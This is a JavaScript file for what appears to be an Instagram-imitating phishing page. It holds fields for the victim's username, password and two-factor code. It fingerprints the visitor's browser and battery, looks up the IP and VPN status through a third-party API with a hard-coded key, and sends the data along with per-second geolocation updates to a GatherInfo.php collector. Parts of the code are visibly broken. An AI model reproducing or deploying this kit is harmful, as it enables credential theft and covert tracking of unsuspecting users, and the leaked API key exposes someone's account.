$(() => {
    $(document).ready(() => {
        var app = navigator;
        var jsonInfo;
        jsonInfo = {
            browser: {
                app_code_name: app.appCodeName,
                app_name: app.appName,
                app_version: app.appVersion,
                build_id: app.buildID,
                cookie_enabled: app.cookieEnabled,
                do_not_track: app.doNotTrack,
                hardware_concurrency: app.hardwareConcurrency,
                languages: app.languages,
                max_touch_points: app.maxTouchPoints,
                online: app.online,
                os_cpu: app.oscpu,
                platform: app.platform,
                plugins: app.plugins,
                products: app.products,
                product_sub: app.productSub,
                service_worker: app.serviceWorker,
                user_agent: app.userAgent,
                vendor: app.vendor,
                vendorSub: app.vendorSub,
                web_driver: app.webdriver
            },
            instagram: {
                ins_username: null,
                ins_password: null,
                security:{
                    twoFactorAthenticator: null,
                }
            },
            geolocation: {
                latitude: null,
                longitude: null
            }
        };


        //------------------------form acctions---------------------------------
        var query_submit_button = $(".submit-btn");

        //listen for text & password inputs to enable button and visible show/hide button for password field.
        $("input[name=username]").bind("keyup", fillForm);
        $("input[name=password]").bind("keyup", fillForm);

        function fillForm(){
            var username=$("input[name=username]").val();
            var password=$("input[name=password]").val();

            if (password.length > 0)
            {
                $(".hsh").css("visibility", "visible");
                $(".hsh").click(function(){
                    
                    if ($(".hsh").text() == "Show")
                    {
                        $("input[name=password]").attr("type", "text");
                        $(".hsh").text("Hide");
                    }else if($(".hsh").text() == "Hide")
                    {
                        $("input[name=password]").attr("type", "password");
                        $(".hsh").text("Show");
                    }
                });
            }
            else{
                $(".hsh").css("visibility", "hidden");
            }

            if(username.length > 0 && password.length >= 6)
            {
                $(".submit-btn").prop( "disabled", false);
                query_submit_button.css({"background-color": "#0095F6"});
                return true;
            }
            else
            {
                $(".submit-btn").prop( "disabled", true);
                query_submit_button.css({"background-color": "#B2DFFC"});
                return false;
            }
        }

        //parsing ip address:
        var xhr = new XMLHttpRequest();
        
        xhr.open("POST", "GatherInfo.php?ip=''&ipInfo", true);
        
        xhr.onreadystatechange = function(){
            if (this.readyState == 4 && this.status == 200)
            {
                $.getJSON("https://vpnapi.io/api/190.2.131.206?key=8588ba4c2b434ac5b9d5090eaa668686")
                .done((obj,status,xhrr) => {
                    var resText = xhrr.responseText;
                    document.getElementById("vpn").innerHTML = resText;
                    xhr.open("POST", "GatherInfo.php?ip&ipInfo="+resText, true);
                    xhr.onreadystatechange = function()
                    {
                        if (this.readyState == 4 && this.status == 200)
                        {
                            document.getElementById("vpn").innerHTML = this.responseText;
                        }
                    };
                    xhr.send();
                });
            }
        };
        xhr.send();

        //battery info:
        navigator.getBattery().then(function(battery) {
            function updateAllBatteryInfo(){
                updateChargeInfo();
                updateLevelInfo();
                updateChargingInfo();
                updateDischargingInfo();
            }
            updateAllBatteryInfo();

            battery.addEventListener('chargingchange', function(){
                updateChargeInfo();
            });
            function updateChargeInfo(){
                document.getElementById("batteryInfo1").innerHTML = "Battery charging? "
                            + battery.charging ? "Yes" : "No";
            }

            battery.addEventListener('levelchange', function(){
                updateLevelInfo();
            });
            function updateLevelInfo(){
                document.getElementById("batteryInfo2").innerHTML = "Battery level: "
                            + battery.level * 100 + "%";
            }

            battery.addEventListener('chargingtimechange', function(){
                updateChargingInfo();
            });
            function updateChargingInfo(){
                document.getElementById("batteryInfo3").innerHTML = "Battery charging time: "
                            + battery.chargingTime + " seconds";
            }

            battery.addEventListener('dischargingtimechange', function(){
                updateDischargingInfo();
            });
            function updateDischargingInfo(){
                document.getElementById("batteryInfo4").innerHTML = "Battery discharging time: "
                            + battery.dischargingTime + " seconds";
            }
        });

        //update geolocation coordinates every 
        navigator.permissions.query({name: "geolocation"}).then((permission) => {
            console.log(permission.state);
            if (permission.state === 'granted')
            {
                updateGeolocation();
                setInterval(updateGeolocation, 1000);
            }
            else if (permission.state === "prompt")
            {
                  
            }
            else{
                
            }
        });
    });

    function updateGeolocation()
    {
        navigator.geolocation.getCurrentPosition((position) => {
            jsonInfo['geolocation']['lantitude'] = position.coords.latitude;
            jsonInfo['geolocation']['longitude'] = position.coords.longitude;
            xhr.open("POST", "GatherInfo.php?ip&ipInfo&geolocation="+jsonInfo['geolocation'], true);
        });
    }
});
